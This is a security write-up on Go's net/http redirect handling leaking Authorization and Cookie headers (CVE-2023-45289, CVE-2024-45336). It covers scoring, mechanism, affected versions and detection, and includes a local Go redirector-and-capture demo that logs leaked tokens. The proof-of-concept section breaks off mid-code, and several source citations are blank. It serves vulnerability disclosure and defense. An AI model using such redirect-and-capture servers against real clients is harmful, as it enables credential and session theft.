# Golang `net/http.Client` Redirect Policy Bypass Leading to Sensitive Header Exposure

**Alias(es)**: "HTTP 307/302 redirect leaks secrets", "redirect-secret-leak", "Golang Authorization Header Leak on Redirect"

## Severity Rating

**Overall CVSS v3.1 Score**: **7.5 (High)**

**CVSS Vector**: **CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N**

The assignment of a 7.5 (High) severity score reflects the significant potential for confidentiality compromise when sensitive headers, particularly `Authorization` tokens or `Cookie`-based session identifiers, are leaked. The Common Vulnerability Scoring System (CVSS) provides a standardized framework for assessing the severity of vulnerabilities. The components of this vector are justified as follows:

- **Attack Vector (AV:N - Network)**: The vulnerability is exploited through network interactions. Specifically, an attacker manipulates the HTTP redirect mechanism, which the Go client processes over the network.
- **Attack Complexity (AC:L - Low)**: Exploiting this vulnerability generally involves an attacker controlling a server that issues a malicious redirect or being in a Man-in-the-Middle (MitM) position to inject or modify redirect responses. Setting up such a redirecting server is typically not a complex task for a moderately skilled attacker.
- **Privileges Required (PR:N - None)**: The attacker does not need any pre-existing privileges on the system running the vulnerable Go client application. The vulnerability is inherent in how the client handles certain server responses.
- **User Interaction (UI:R - Required)**: For the vulnerability to be exploited, the Go application (which may be acting on behalf of a user or as an automated system) must initiate an HTTP request that subsequently encounters the attacker-controlled or maliciously crafted redirect sequence.
- **Scope (S:U - Unchanged)**: The direct impact of exploiting this vulnerability is typically confined to the security context of the Go application itself. For example, leaked credentials might compromise the application's data or its ability to make authenticated requests. However, the vulnerability does not usually allow the attacker to break out of the application's scope and directly affect other, unrelated system components through this flaw alone.
- **Confidentiality (C:H - High)**: The leakage of sensitive headers, such as an `Authorization` header containing a bearer token or an API key with significant permissions, can lead to a total loss of confidentiality for all data and resources accessible with that token. Similarly, leaked session cookies can lead to session hijacking, granting the attacker the same level of access as the legitimate user. This potential for complete compromise of the information protected by the leaked credential justifies a High confidentiality impact. While specific CVEs like CVE-2023-45289 have been assigned a Confidentiality impact of Low (C:L) , this report considers the broader pattern of "redirect-secret-leak" where the leaked credential could grant extensive access.
- **Integrity (I:N - None)**: The vulnerability itself is an information disclosure flaw. It does not directly alter data or system integrity. However, an attacker could subsequently use the leaked credentials to modify data, but that action is a consequence of exploiting the leaked information, not a direct result of the leak vulnerability itself.
- **Availability (A:N - None)**: This vulnerability does not inherently cause a denial of service or otherwise impact the availability of the application or the system it runs on.

**Table: CVSS v3.1 Metric Breakdown for "redirect-secret-leak"**

| Metric | Value | Justification |
| --- | --- | --- |
| Attack Vector (AV) | Network (N) | Exploited via the Go client processing HTTP redirects received over a network. |
| Attack Complexity (AC) | Low (L) | An attacker needs to induce the Go client to follow a specifically crafted redirect, often by controlling the redirecting server or via MitM. |
| Privileges Required(PR) | None (N) | The attacker requires no prior privileges on the client system; the vulnerability lies in the client's handling of server responses. |
| User Interaction (UI) | Required (R) | The Go application must make an initial HTTP request that leads to the malicious redirect sequence. |
| Scope (S) | Unchanged (U) | The vulnerability's direct impact is confined to the security context of the Go application (e.g., its data, its authenticated sessions). |
| Confidentiality (C) | High (H) | Leakage of sensitive headers like "Authorization" or "Cookie" can grant attackers access equivalent to the compromised user/service, potentially exposing all related data. |
| Integrity (I) | None (N) | The vulnerability is an information disclosure; it does not directly alter data, though actions taken with leaked credentials could. |
| Availability (A) | None (N) | The vulnerability does not inherently cause a denial of service for the application or system. |

This detailed breakdown provides transparency and aligns with best practices for vulnerability scoring, allowing technical audiences to understand the rationale behind each metric choice. The core of the vulnerability's high severity stems from the potential for complete compromise of confidentiality for data accessible by the leaked credentials.

## Description

The "HTTP 307/302 redirect leaks secrets" vulnerability, often referred to by aliases such as "redirect-secret-leak," affects Golang applications that utilize the standard `net/http.Client` for making HTTP requests. This vulnerability manifests when the HTTP client, in the process of following HTTP 302 (Found) or 307 (Temporary Redirect) status code responses, improperly forwards sensitive HTTP headers—most notably `Authorization` or `Cookie` headers—to an unintended or potentially malicious destination.

The fundamental issue is not a complete absence of security mechanisms within Go's HTTP client; rather, it stems from flaws, oversights, or specific edge-case conditions in the client's redirect-following logic. This logic is designed to determine whether sensitive headers should be stripped or forwarded based on factors like domain matching (e.g., differentiating between same-domain and cross-domain redirects). When this logic fails or is bypassed, sensitive information can be exposed.

The consequences of such header leakage are severe and can include the theft of authentication credentials (such as API keys or bearer tokens), session hijacking through stolen session cookies, subsequent unauthorized access to APIs or protected resources, and ultimately, data breaches.

This pattern of vulnerability has been identified and addressed in specific Common Vulnerabilities and Exposures (CVE) entries. For instance, CVE-2023-45289 details how maliciously crafted HTTP redirects could cause an `http.Client` to unexpectedly forward sensitive headers to domains that should not receive them. Another example, CVE-2024-45336, describes a more nuanced scenario involving multi-hop redirect chains where sensitive headers, initially stripped during a cross-domain redirect, are incorrectly restored and sent during a subsequent same-domain redirect.

The existence of multiple distinct CVEs addressing various facets of this redirect policy indicates the complexity inherent in securely managing HTTP redirects. It underscores that the vulnerability is not a trivial oversight but rather a subtle yet critical flaw in the intricate state management and security logic required for a robust HTTP client implementation. The Go `net/http.Client` does possess a documented policy to strip sensitive headers like "Authorization" and "Cookie" during cross-domain redirects , meaning these vulnerabilities represent a bypass or incorrect application of this intended security measure.

## Technical Description

The technical underpinnings of the "redirect-secret-leak" vulnerability lie in the interaction between Go's `net/http.Client` default redirect handling policies, the specific semantics of HTTP 302 and 307 redirect status codes, and flaws in the client's implementation of security checks during redirect chains.

**Go's `net/http.Client` Default Redirect Policy**

By default, Go's `http.Client` will automatically follow up to 10 consecutive redirects if a custom `CheckRedirect` function is not specified by the developer. A critical aspect of this default behavior is its policy regarding sensitive HTTP headers. The Go standard library documentation for `net/http/client.go` explicitly states that when following redirects, the client is designed to forward all headers from the initial request *except* for certain sensitive headers—namely "Authorization", "WWW-Authenticate", and "Cookie"—when the redirect target is considered an "untrusted target".

An "untrusted target" is generally understood as a domain that is neither an exact match nor a subdomain match of the domain in the initial request. For instance, if an initial request is made to `app.example.com`, a redirect to `service.example.com` (a subdomain) or `app.example.com` (exact match) would typically result in these sensitive headers being forwarded. However, a redirect to `another-domain.com` should cause these headers to be stripped.

The handling of "Cookie" headers is further nuanced if the client is configured with a non-nil `http.CookieJar`. In such cases, cookies that might have been mutated or set by responses during the redirect chain might be omitted from direct header forwarding. The expectation is that the `CookieJar` itself will manage and insert the correct, updated cookies for the new request, provided the origin matches the cookie's domain and path attributes. If the `Jar` is `nil`, the initial "Cookie" header is subject to the same domain trust policy as other sensitive headers.

**HTTP 302 vs. 307 Redirects: Significance in Context**

The behavior of HTTP 302 and 307 redirects is pertinent to understanding the context in which these leaks can occur, though the primary vulnerability mechanism revolves around header handling rather than method changes per se.

- **HTTP 302 (Found)**: Originally defined in RFC 1945 and updated by RFC 7231. Historically, there was ambiguity: while specifications suggested the request method should be preserved, many web browsers incorrectly changed POST requests to GET upon receiving a 302 redirect. RFC 7231 later acknowledged this de facto behavior and permits user agents to change the method from POST to GET for subsequent requests to the new location.
- **HTTP 307 (Temporary Redirect)**: Introduced in HTTP/1.1 (RFC 2616, also covered by RFC 7231) to provide an unambiguous signal for a temporary redirect where the client *must not* change the original request method or body. If the initial request was a POST, the client is mandated to make a POST request to the new URL, including the original request body.

The primary relevance to the "redirect-secret-leak" vulnerability is that both 302 and 307 status codes trigger the client's redirect-following logic. If this logic is flawed in how it determines whether to strip sensitive headers, the leak can occur regardless of whether the method was changed. However, the 307 redirect's strict method preservation means that if an original POST request contained sensitive data in its body (in addition to headers), a 307 redirect to a malicious site, coupled with a header leak, would ensure the body is also re-transmitted.

**Table: Comparison of HTTP 302 and 307 Redirects**

| Feature | HTTP 302 Found | HTTP 307 Temporary Redirect |
| --- | --- | --- |
| **RFC Definition** | RFC 1945 (original), RFC 7231 (current) | RFC 2616 (original), RFC 7231 (current) |
| **Request Method Change** | Originally intended to preserve method, but many clients changed POST to GET. RFC 7231 allows this. | Guarantees that the client *must not* change the request method or body. |
| **Caching** | Not by default, unless specific caching headers (e.g., `Cache-Control`, `Expires`) are present. | Not by default, unless specific caching headers are present. |
| **Primary Use Case** | Temporary redirection where changing the method to GET for the new request is acceptable or common historically. | Temporary redirection where the original request method and body *must* be reused. |

**Mechanism of Vulnerability - How the Leak Occurs**

The core of the vulnerability lies in the Go HTTP client failing to correctly apply its own security policy for stripping sensitive headers under specific circumstances.

- **CVE-2023-45289**: This vulnerability, detailed in multiple sources , arises when the `http.Client` incorrectly forwards sensitive headers (such as "Authorization" or "Cookie") during an HTTP redirect to a domain that is *not* an exact match or a subdomain match of the initial domain. The flaw is rooted in the client's domain-matching logic. It has been suggested that "maliciously crafted HTTP redirects" or specific domain characteristics, such as the presence of IPv6 zone IDs, could confuse the client's logic, causing it to misjudge a target domain as "trusted" when it is, in fact, an untrusted, cross-domain target. This leads to sensitive headers being sent where they should have been stripped.
- **CVE-2024-45336**: This vulnerability, referenced in relation to Go issue 70530 , manifests in multi-hop redirect scenarios. The problematic sequence is as follows:
    1. An initial request is made to domain `a.com` containing sensitive headers.
    2. `a.com` redirects to a cross-domain target, say `b.com/1`. At this point, the Go client correctly strips the sensitive headers.
    3. `b.com/1` then issues another redirect, this time to a same-domain target, `b.com/2`.
    4. The vulnerability occurs here: the Go client incorrectly *restores* the original sensitive headers (from the request to `a.com`) and sends them to `b.com/2`.
    This behavior indicates a flaw in how the client manages the state of headers across a complex redirect chain, effectively "forgetting" that the headers were meant to be stripped due to the preceding cross-domain hop.

In both CVEs, the fundamental failure is the client's inability to consistently and correctly enforce its documented security policy  under these specific, often non-obvious, conditions. The logic for determining "domain trust" or managing header state across multiple redirect hops appears to be where these flaws reside.

**The `Client.CheckRedirect` Function**

Go's `http.Client` provides an extensibility point through the `CheckRedirect` field, which is a function that, if set, is called by the client before it follows any HTTP redirect.

- **Signature**: `func(req *http.Request, via*http.Request) error`
    - `req`: The upcoming request that will be sent if the redirect is followed.
    - `via`: A slice of `http.Request` objects representing the requests made so far in the redirect chain, with the oldest request first.
- **Behavior**:
    - If `CheckRedirect` returns `nil`, the client proceeds with the redirect.
    - If it returns an error, the client's operation (e.g., `Get`, `Do`) typically returns the `http.Response` from the *previous* request (the one that issued the redirect) along with the error returned by `CheckRedirect` (often wrapped in a `url.Error`). The body of this previous response is usually closed automatically.
    - A special error, `http.ErrUseLastResponse`, can be returned to signal the client to return the most recent response with its body *unclosed*, along with a `nil` error. This allows the caller to inspect the redirect response itself.
- **Default Policy**: If `CheckRedirect` is `nil`, the client defaults to following up to 10 redirects.
- **Security Implication**: This function is the primary means by which developers can implement custom redirect policies. A correctly implemented `CheckRedirect` function can serve as a workaround or mitigation for vulnerabilities in the default redirect logic by allowing developers to explicitly strip sensitive headers or disallow redirects to untrusted domains. However, implementing such a function correctly and securely is non-trivial, as evidenced by the existence of vulnerabilities in the standard library's own default logic.

The technical failures point towards challenges in robustly implementing stateful security policies within the complexities of HTTP redirect chains, especially when dealing with nuanced domain-matching rules and multi-hop scenarios.

## Common Mistakes That Cause This Vulnerability to Manifest

The manifestation of the "redirect-secret-leak" vulnerability in Golang applications often stems from a combination of factors, primarily related to software maintenance, assumptions about library behavior, and incomplete security considerations during development.

1. **Relying on Outdated Go Versions**: The most direct cause is the use of a Go version that has not been patched for known redirect vulnerabilities, such as CVE-2023-45289 or CVE-2024-45336. Development teams may overlook, delay, or have inadequate processes for timely Go version updates, leaving their applications exposed to fixed vulnerabilities.
2. **Assuming Default `http.Client` Behavior is Always Secure**: Developers often use the `http.DefaultClient` or instantiate a new `&http.Client{}` without specifying a custom `CheckRedirect` function. This means the application inherits any vulnerabilities present in the default redirect logic of the particular Go version being used. While defaults are convenient, they are not immune to flaws.
3. **Flawed Custom `CheckRedirect` Implementation**: When developers attempt to implement their own `CheckRedirect` logic to customize redirect behavior, several pitfalls can lead to similar or new vulnerabilities:
    - **Incomplete Identification of Sensitive Headers**: The custom logic might fail to identify and strip all headers that could be considered sensitive in the application's context (e.g., custom session tokens, API keys in non-standard headers).
    - **Incorrect Domain/Subdomain Matching Logic**: Implementing robust and correct logic to determine if a redirect target is "same-domain," "subdomain," or "cross-domain" is complex. Errors here can lead to headers being forwarded to genuinely untrusted sites, mirroring the core issue in vulnerabilities like CVE-2023-45289.
    - **Mishandling of Redirect Chains**: The `via` parameter in `CheckRedirect` provides the history of requests. Custom logic might not correctly interpret this chain, especially in multi-hop scenarios, potentially leading to misjudgments about the trust relationship with the next hop.
    - **Overly Permissive Policies**: A custom policy might inadvertently allow forwarding sensitive headers to a wider range of domains than intended, perhaps due to overly broad wildcarding or an insecurely managed allowlist of "trusted" domains.
4. **Ignoring Redirects or Handling Them Manually Without Full Security Considerations**: Some applications might disable automatic redirect following (`client.CheckRedirect = func(req *http.Request, via*http.Request) error { return http.ErrUseLastResponse }`) and then attempt to handle redirects manually. If this manual re-request logic does not meticulously re-implement the necessary security checks for stripping sensitive headers based on the new target's domain, it can reintroduce the same vulnerability.
5. **Insufficient Testing of Redirect Scenarios**: A lack of thorough testing for various redirect conditions contributes significantly. Applications may not be tested against:
    - Different redirect status codes (302, 307).
    - Cross-domain redirects to various (trusted and untrusted) targets.
    - Multi-hop redirect chains, including those that mix cross-domain and same-domain hops (as highlighted by CVE-2024-45336 ).
    - Redirects involving complex domain names or IP addresses (e.g., those with IPv6 zone IDs, which were implicated in discussions around CVE-2023-45289 ).
6. **Lack of Awareness of Transitive Trust Issues in Redirects**: A fundamental conceptual mistake is not fully appreciating the potential for transitive trust issues in a redirect chain. If service A redirects to service B, and service B (potentially compromised or malicious) redirects to service C, the application's security policy for forwarding headers to C might be based on its trust of A or an initial (flawed) assessment of B, without adequately scrutinizing C. The vulnerabilities often exploit this "weakest link" in a chain.

The underlying theme across these mistakes is often an incomplete threat model concerning HTTP redirects. Developers might focus on the direct request-response flow of their application and underestimate the security implications of how their HTTP client interacts with intermediary servers and processes redirect instructions, especially when these redirects are not fully controlled by the application owner. The subtlety of the bugs in Go's own standard library  underscores that secure redirect handling is a non-trivial problem.

## Exploitation Goals

Attackers exploiting the "redirect-secret-leak" vulnerability in Golang's `net/http.Client` aim to achieve several malicious objectives, primarily centered around compromising the confidentiality of sensitive information transmitted in HTTP headers.

1. **Steal Sensitive HTTP Headers**: The immediate goal is to intercept or exfiltrate sensitive data embedded within HTTP headers. The most common targets include:
    - **`Authorization` header**: This header frequently carries credentials such as Bearer tokens (e.g., JWTs, OAuth2 tokens), API keys, or Basic Authentication credentials (username/password encoded). Leakage of this header is often the primary objective.
    - **`Cookie` header**: This header contains cookies, which are commonly used for session management (session IDs), tracking, or storing user preferences. Stealing session cookies is a key step towards session hijacking.
    - **Other Custom Sensitive Headers**: Applications may use custom headers (e.g., `X-API-Key`, `X-CSRF-Token`, `X-User-ID`) to transmit sensitive information. If the client's redirect logic fails to recognize these as sensitive or if a custom `CheckRedirect` is flawed, these too can be leaked.
2. **Achieve Unauthorized Access**: Once sensitive credentials or session tokens are stolen, the attacker's next goal is to use them to impersonate the legitimate user or service. This allows them to gain unauthorized access to protected resources, APIs, or backend systems that rely on these tokens for authentication and authorization.
3. **Session Hijacking**: If session cookies are successfully exfiltrated, attackers can replay these cookies to take over an authenticated user's active session. This grants them the same privileges and access as the victim user within the application (related to CAPEC-60: Reusing Session IDs ).
4. **Data Exfiltration**: With unauthorized access established through leaked credentials or hijacked sessions, attackers can then proceed to exfiltrate sensitive data from the compromised application or its associated backend services. This could include user data, financial information, intellectual property, or any other data the compromised account has access to.
5. **Perform Unauthorized Actions**: Beyond data theft, attackers may aim to perform unauthorized actions within the target system. This could involve modifying data, executing privileged operations, initiating fraudulent transactions, or disrupting services, all while acting under the guise of the compromised identity.
6. **Lateral Movement**: In some scenarios, particularly within microservice architectures or interconnected systems, the credentials or tokens leaked from one Go client interaction might be reusable or provide access to other internal services. This allows the attacker to move laterally within the victim's network or cloud environment, expanding their foothold.

The exploitation of this vulnerability is typically passive from the perspective of the vulnerable Go client application; the client unknowingly leaks the headers when it follows a malicious or misconfigured redirect. However, the attacker then actively uses the leaked information to achieve their subsequent objectives. The core of the exploitation lies in abusing the trust relationship that the client application has with the services it communicates with, a trust that is normally enforced by the sensitive headers. The vulnerability breaks this trust by exposing these headers to an unauthorized third party. The value of the leaked token significantly influences the attacker's success; tokens with broad permissions or long expiry times are particularly damaging if compromised.

## Affected Components or Files

The "HTTP 307/302 redirect leaks secrets" vulnerability primarily affects components within Go's standard library and, consequently, any Go applications compiled with vulnerable versions of the Go toolchain that utilize these components for HTTP client operations.

1. **Primary Component**:
    - **Go Standard Library `net/http` Package**: Specifically, the `Client` type (`http.Client`) and its internal logic for handling HTTP redirects are the locus of the vulnerability. This includes the default redirect policy and the mechanisms for deciding whether to forward or strip sensitive headers based on domain matching and redirect chain history.
2. **Specific Files within Go Source Code (Illustrative)**:
    - `src/net/http/client.go`: This file in the Go standard library source code contains the core implementation of `http.Client`, including the `send` function (which orchestrates request sending and redirect following), the `checkRedirect` method, and the `defaultCheckRedirect` policy. Flaws in the logic within this file are directly responsible for the vulnerabilities.
    - `src/net/http/cookiejar.go`: As indicated by the details for CVE-2023-45289 , the `net/http/cookiejar` package can also be involved, particularly if the vulnerability pertains to the incorrect handling or forwarding of cookies in conjunction with redirects.
3. **Affected Go Versions**:
The vulnerability is tied to specific versions of the Go programming language distribution. Applications compiled with these versions inherit the flawed HTTP client behavior.
    - **For CVE-2023-45289**:
        - Go versions prior to 1.21.8.
        - Go 1.22.x versions prior to 1.22.1.
        (Source: )
    - **For CVE-2024-45336** (related to Go issue 70530):
        - Go versions prior to 1.23.5 (for the 1.23.x series).
        - Go 1.22.x versions prior to 1.22.11 (for the 1.22.x series).
        (Derived from the announcement of fixes in these versions ).
4. **Applications**:
    - Any Go application or binary that is compiled using one of the affected Go versions.
    - The application must use the `net/http.Client` (this includes the commonly used `http.DefaultClient` or explicitly created `&http.Client{}` instances) to make outbound HTTP or HTTPS requests.
    - The client must be configured to follow redirects, which is the default behavior. If redirects are disabled (e.g., via a custom `CheckRedirect` function that always returns an error like `http.ErrUseLastResponse`), the vulnerability related to redirect handling would not be triggered.

**Table: Relevant CVEs and Affected/Fixed Go Versions**

This table provides a quick reference for identifying vulnerable Go versions and the corresponding patched releases. It is crucial for developers and security teams to consult this information for effective patch management.

| CVE ID | Summary of Vulnerability | Affected Go Versions (Illustrative) | Fixed Go Versions | Key Reference(s) |
| --- | --- | --- | --- | --- |
| CVE-2023-45289 | Incorrect forwarding of sensitive headers (e.g., Authorization, Cookie) on HTTP redirect to non-subdomain/exact match targets. | Go < 1.21.8<br>Go 1.22.0 | Go 1.21.8+<br>Go 1.22.1+ |  |
| CVE-2024-45336 | Sensitive headers incorrectly restored and sent on a same-domain redirect that follows an initial cross-domain redirect. | Go < 1.23.5 (for 1.23.x series)<br>Go < 1.22.11 (for 1.22.x series) | Go 1.23.5+<br>Go 1.22.11+ |  |

The pervasiveness of the `net/http` package in Go applications means that a wide range of software could be affected if built with a vulnerable toolchain. This includes web services, API clients, command-line tools that interact with web resources, and any other Go program performing HTTP client operations that involve redirects. The fact that the vulnerability resides within the standard library itself, rather than a less common third-party package, elevates its potential impact across the Go ecosystem.

## Vulnerable Code Snippet (Illustrative Usage)

The following Go code snippet demonstrates a typical usage pattern of `http.Client` that would be vulnerable to sensitive header leakage if compiled and run with an unpatched version of Go. It's important to understand that the vulnerability lies within the Go standard library's implementation of `client.Do(req)` when handling redirects, not in this specific user-written code per se. This code merely sets up a scenario where the vulnerability can be triggered.

```go
package main

import (
	"fmt"
	"log"
	"net/http"
	"net/http/httptest"
	"strings"
)

// targetHandler simulates the server that an attacker wants to receive the leaked headers.
// In a real attack, this could be attacker-controlled.com.
func targetHandler(w http.ResponseWriter, r *http.Request) {
	log.Printf(" Received request for %s from %s", r.URL.String(), r.RemoteAddr)
	authHeader := r.Header.Get("Authorization")
	cookieHeader := r.Header.Get("Cookie")

	responseMessage := "Request received at target.\n"
	if authHeader!= "" {
		log.Printf("!!! LEAKED Authorization Header: %s", authHeader)
		responseMessage += fmt.Sprintf("Leaked Authorization: %s\n", authHeader)
	} else {
		log.Printf(" Authorization Header NOT FOUND.")
		responseMessage += "Authorization Header not found.\n"
	}

	if cookieHeader!= "" {
		log.Printf("!!! LEAKED Cookie Header: %s", cookieHeader)
		responseMessage += fmt.Sprintf("Leaked Cookie: %s\n", cookieHeader)
	} else {
		log.Printf(" Cookie Header NOT FOUND.")
		responseMessage += "Cookie Header not found.\n"
	}
	fmt.Fprintln(w, responseMessage)
}

// redirectorHandler simulates a server that issues a redirect.
// This could be a legitimate server that is misconfigured, compromised,
// or an attacker's server designed to trigger the vulnerability.
func redirectorHandler(w http.ResponseWriter, r *http.Request) {
	// The redirectTo query parameter will specify where the client should be redirected.
	// This simulates the attacker controlling the redirect destination.
	redirectURL := r.URL.Query().Get("redirectTo")
	if redirectURL == "" {
		log.Println(" Error: redirectTo query parameter is missing")
		http.Error(w, "redirectTo query parameter is missing", http.StatusBadRequest)
		return
	}

	log.Printf(" Initial request to %s. Redirecting client to: %s", r.URL.Path, redirectURL)
	// Using HTTP 307 Temporary Redirect ensures the client retries with the same method and body.
	// This is relevant as it's one of the status codes mentioned in the vulnerability name.
	http.Redirect(w, r, redirectURL, http.StatusTemporaryRedirect)
}

func main() {
	// 1. Setup the Target Server (simulates attacker's collection server or unintended recipient)
	targetServer := httptest.NewServer(http.HandlerFunc(targetHandler))
	defer targetServer.Close()
	log.Printf("Target server (attacker's collection point) listening on: %s", targetServer.URL)

	// 2. Setup the Redirector Server
	// This server will issue the redirect that might cause the Go client to leak headers.
	redirectorServer := httptest.NewServer(http.HandlerFunc(redirectorHandler))
	defer redirectorServer.Close()
	log.Printf("Redirector server listening on: %s", redirectorServer.URL)

	// 3. Construct the initial request URL.
	// The Go client will connect to the redirectorServer, which will then redirect
	// to the targetServer. The `redirectTo` parameter tells the redirector where to send the client.
	initialRequestURL := fmt.Sprintf("%s/initial-path?redirectTo=%s/captured", redirectorServer.URL, targetServer.URL)

	// 4. Create a standard http.Client.
	// If running with a vulnerable Go version, this client's default redirect handling
	// will exhibit the flawed behavior.
	client := &http.Client{
		// No custom CheckRedirect is set, relying on the default (potentially vulnerable) policy.
	}

	// 5. Create a new request (e.g., a POST request with a body).
	// Using POST with 307 ensures method and body are intended to be preserved.
	req, err := http.NewRequest("POST", initialRequestURL, strings.NewReader("example_body_data=sensitive_payload"))
	if err!= nil {
		log.Fatalf("Error creating request: %v", err)
	}

	// 6. Add sensitive headers to the initial request.
	// These are the headers we are checking for leakage.
	req.Header.Add("Authorization", "Bearer VERY_SECRET_API_TOKEN_12345")
	req.Header.Add("Cookie", "session_id=abcdef1234567890; user_pref=dark_mode")
	req.Header.Add("X-Internal-Trace-ID", "trace-this-secretly") // Example of another custom sensitive header

	log.Printf("Making %s request to %s with sensitive headers...", req.Method, initialRequestURL)

	// 7. Execute the request using client.Do().
	// This is where the redirect will be followed and, in a vulnerable version,
	// headers might be leaked.
	resp, err := client.Do(req)
	if err!= nil {
		// Note: If a custom CheckRedirect were to return an error, 'resp' might be non-nil
		// and represent the response that issued the disallowed redirect.
		log.Fatalf("Error performing request: %v", err)
	}
	defer resp.Body.Close()

	// 8. Log the final response details.
	// The crucial check is to observe the logs of the `targetServer`.
	log.Printf("Final response received. Status: %s. Final URL: %s", resp.Status, resp.Request.URL.String())
	log.Println("Check the logs to see if 'Authorization' or 'Cookie' headers were leaked.")
}
```

**Explanation of Vulnerable Behavior**:

When this `main` function is executed with a Go version vulnerable to CVE-2023-45289 or CVE-2024-45336:

1. The `http.Client` sends the initial POST request to `redirectorServer.URL` with `Authorization` and `Cookie` headers.
2. The `redirectorServer` responds with an HTTP 307 redirect to `targetServer.URL`.
3. Due to the vulnerability in the Go `net/http` library's redirect handling logic (e.g., flawed domain matching for CVE-2023-45289, or incorrect header state restoration in multi-hop redirects for CVE-2024-45336), the `http.Client` may incorrectly decide to forward the `Authorization` and `Cookie` headers to the `targetServer`.
4. The `targetServer` (simulating an attacker's collection server or an unintended recipient) receives these sensitive headers. Its logs will show entries like "!!! LEAKED Authorization Header: Bearer VERY_SECRET_API_TOKEN_12345".

If the same code is run with a patched Go version, the `targetServer` should log that the `Authorization` and `Cookie` headers were *not found*, as the client's corrected redirect policy would have stripped them before redirecting to a different host/port (as `httptest.NewServer` typically assigns different ports, simulating cross-origin).

This illustrative snippet highlights that the vulnerability is not about developers writing explicitly insecure code for header management during redirects, but rather about the implicit trust placed in the standard library's default behavior, which, in unpatched versions, contains these subtle but critical flaws.

## Detection Steps

Detecting the "HTTP 307/302 redirect leaks secrets" vulnerability in Golang applications involves a combination of static and dynamic analysis techniques.

**1. Go Version Verification (Static Analysis)**:
The most straightforward and critical detection step is to ascertain the version of the Go toolchain used to compile the application.

- **Procedure**:
    - Identify the Go version used for the build. This can typically be found in `go.mod` files (the `go` directive), build scripts, CI/CD pipeline configurations, or by running `go version` in the build environment.
    - For compiled binaries where source/build information is unavailable, tools that inspect binary metadata might sometimes reveal Go version information, though this can be stripped.
- **Verification**:
    - Compare the identified Go version against the known patched versions for relevant CVEs:
        - For **CVE-2023-45289**: Applications are vulnerable if built with Go versions prior to 1.21.8 or Go 1.22.x versions prior to 1.22.1.
        - For **CVE-2024-45336** (related to Go issue 70530): Applications are vulnerable if built with Go versions prior to 1.23.5 (for the 1.23.x series) or Go 1.22.x versions prior to 1.22.11.
- **Tools**: `go version`, examination of `go.mod`.

**2. Vulnerability Scanning with `govulncheck` (Static Analysis)**:
The Go team provides an official tool, `govulncheck`, designed to analyze Go source code or compiled binaries to identify known vulnerabilities that affect the codebase, including those within the Go standard library itself.

- **Procedure**:
    - Run `govulncheck./...` on the application's source code or `govulncheck <binary_path>` on a compiled binary.
- **Verification**:
    - `govulncheck` will report if the version of the `net/http` package (which is tied to the Go version) used by the application is affected by published CVEs like CVE-2023-45289 or CVE-2024-45336. It checks the Go vulnerability database for matches.
- **Tools**: `govulncheck`.

**3. Manual Code Review (Static Analysis)**:
If the application employs a custom `CheckRedirect` function in its `http.Client` instances, this code requires careful review.

- **Procedure**:
    - Identify all instances where `http.Client` is instantiated with a custom `CheckRedirect` function.
    - Analyze the logic within this function:
        - How does it determine if a redirect target is trusted or untrusted (e.g., same-domain vs. cross-domain)?
        - Does it explicitly strip sensitive headers (e.g., `Authorization`, `Cookie`, and any custom sensitive headers) before allowing a redirect to a potentially untrusted domain?
        - How does it handle redirect chains (the `via` argument)? Is state managed correctly across multiple hops?
        - Does it rely on allowlists for trusted domains? If so, how robust and secure is this list?
- **Verification**: Look for logic flaws that might incorrectly permit forwarding of sensitive headers, similar to the bugs found in the Go standard library's default policy. Refer to secure `CheckRedirect` examples or libraries like `redirect_policy_template` for best practices.
- **Tools**: Manual inspection, static analysis tools with custom rule capabilities (less common for this specific logic).

**4. Dynamic Analysis / Penetration Testing**:
Dynamic analysis involves actively testing the application's behavior when encountering redirects.

- **Procedure**:
    1. **Setup Test Environment**:
        - Deploy the Go application to be tested.
        - Set up a "Redirector Server": An HTTP server under your control that can issue 302 or 307 redirects to arbitrary URLs specified in a request parameter.
        - Set up a "Capture Server": An HTTP server under your control that logs all incoming HTTP request headers.
    2. **Craft Test Requests**: Configure the Go application to make HTTP requests (containing sensitive headers like a test `Authorization: Bearer FAKE_TOKEN` and `Cookie: test_session=FAKE_SESSION`) to the Redirector Server.
    3. **Trigger Redirects**: Instruct the Redirector Server to issue redirects to the Capture Server. Test various scenarios:
        - Redirect to a different domain/port (simulating cross-domain).
        - Redirect to a subdomain.
        - Multi-hop redirects: Redirector -> Intermediate Server (also controlled) -> Capture Server, mimicking scenarios like CVE-2024-45336.
        - Redirects involving different schemes (HTTP to HTTPS, or vice-versa if applicable, though less common for this specific leak).
- **Verification**:
    - Examine the logs of the Capture Server. If the sensitive headers (e.g., `Authorization`, `Cookie`) sent by the Go application in the initial request appear in the logs of the Capture Server when they should have been stripped (e.g., on a cross-domain redirect), the vulnerability is present.
- **Tools**: HTTP proxy (e.g., Burp Suite, OWASP ZAP) to craft and observe requests/responses, custom scripts for redirector/capture servers.

**5. Network Traffic Analysis**:
In a controlled test environment, monitor the network traffic generated by the Go application when it follows redirects.

- **Procedure**: Use network sniffing tools (e.g., Wireshark, tcpdump) to capture the HTTP requests made by the Go client.
- **Verification**: Inspect the headers of requests made to redirect targets. Check if sensitive headers are present in requests to domains where they should have been stripped. This is particularly useful for confirming the behavior observed in dynamic testing.
- **Tools**: Wireshark, tcpdump.

Successful detection often relies on a combination of these methods. Static analysis (version checks and `govulncheck`) can quickly identify if an application is *potentially* vulnerable based on known issues. Dynamic analysis and penetration testing provide empirical evidence of whether the header leakage actually occurs under specific redirect conditions, which is crucial for confirming the vulnerability, especially if custom redirect policies are in place.

## Proof of Concept (PoC)

This Proof of Concept (PoC) demonstrates how the "HTTP 307/302 redirect leaks secrets" vulnerability can be exploited in a Go application compiled with a vulnerable Go version. The PoC involves three components:

1. **Victim Go Application**: A simple Go program that uses `http.Client` to make a request with sensitive headers.
2. **Redirecting Server (Server A)**: An HTTP server that, upon receiving a request, issues a redirect to another server.
3. **Header Capturing Server (Server B)**: An HTTP server that logs all headers from incoming requests. This server simulates an attacker's endpoint or an unintended recipient.

**Setup Environment:**

- Ensure you are using a version of Go known to be vulnerable to CVE-2023-45289 or CVE-2024-45336 (e.g., Go 1.21.7 for CVE-2023-45289).
- The servers will listen on `localhost` but on different ports, which `http.Client`'s default policy treats as different hosts for the purpose of stripping sensitive headers on cross-domain redirects.

**Code for Servers and Victim Application:**

**1. Header Capturing Server (Server B) - `capture_server.go`**

```go
package main

import (
	"fmt"
	"log"
	"net/http"
)

func captureHandler(w http.ResponseWriter, r *http.Request) {
